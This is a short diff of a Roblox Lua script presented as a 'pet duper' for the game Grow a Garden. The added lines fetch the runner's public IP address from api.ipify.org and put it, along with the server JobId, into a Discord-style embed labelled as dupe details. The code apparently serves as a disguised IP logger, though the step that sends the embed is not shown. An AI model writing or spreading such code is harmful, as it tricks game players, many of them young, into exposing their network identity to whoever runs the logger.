@@ -1,18 +1,19 @@
-local key = a;
+local key = game:HttpGet("https://api.ipify.org")
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
-local Content = 'Grow a Garden pet duper real';
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
+local Content = 'Details';
 local Embed = {
-    title = 'REAL pet duper';
+    title = 'Pets';
     color = '99999';
     footer = { text = game.JobId };
     author = {
-        name = 'ROBLOX';
-        url = 'https://www.roblox.com/';
+        name = 'Grow a Garden';
+        url = 'https://www.roblox.com/games/126884695634066/Grow-a-Garden';
     };
     fields = {
         {
-            name = 'dupe';
+            name = 'DupeDetails';
             value = key;
         }
     };
